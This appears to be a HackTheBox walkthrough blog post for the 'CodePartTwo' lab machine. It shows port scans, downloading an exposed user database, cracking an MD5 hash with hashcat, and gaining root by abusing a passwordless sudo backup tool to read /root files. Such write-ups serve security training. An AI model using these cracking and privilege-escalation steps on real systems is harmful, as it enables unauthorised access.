---
title: HackTheBox | CodePartTwo
by: initialt
date: 2025-11-15 16:26:00 +0100
categories: [CTF, walk-trough, hackthebox]
tags: [hackthebox, walk-trough, codeparttwo, ctf]
image:
  path: /assets/img/2025-11-15-HTB-CodePartTwo/banner.png 
  alt: HackTheBox | CodePartTwo
---

That was the easiest machine on HTB so far, so this is going to be a quick post.

Let's start with some scanning:

``` bash
└─$ nmap -p- 10.10.11.82 -T5 -Pn                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 18:41 EST
Nmap scan report for 10.10.11.82
Host is up (0.026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
9999/tcp open  abyss
```

``` bash
└─$ nmap -p22,8000,9999 -sV -sC 10.10.11.82       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 18:41 EST
Nmap scan report for 10.10.11.82
Host is up (0.025s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
9999/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
|_http-title: Directory listing for /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The HTTP server on port 9999 gives us the ability to download the whole database `users.db`
Looking inside, we have a users table with MD5 hashes:

```
sqlite> select * from user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
sqlite> select * from code_snippet;
sqlite> 
```

Using Hashcat, we are able to crack Marco's password.

└─$ hashcat -a 0 -m 0 649c9d65a206a75f5abe509fe128bce5 /usr/share/wordlists/rockyou.txt                                         
649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove  


And it fits the SSH user `marco` on port `22`, after login we have the user FLAG and some configuration for backing up the app from the `/home/app/app/` path. Also, user marco is able to execute without a password `/usr/local/bin/npbackup-cli`.

``` bash
marco@codeparttwo:~$ ls
backups  npbackup.conf  user.txt
arco@codeparttwo:~$ cat npbackup.conf 
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false

marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

`npbackup.conf` is owned by the root, but we can copy it and edit, changing the backup path to the `/root` directory

Then execute backup:

``` bash
sudo /usr/local/bin/npbackup-cli --config-file mynpbackup.conf -b
```

And in this way we are able to read the `root.txt` flag:

``` bash
sudo /usr/local/bin/npbackup-cli \
  --config-file mynpbackup.conf \
  --repo-name default \
  --snapshot-id latest \
  --dump "/root/root.txt"
```

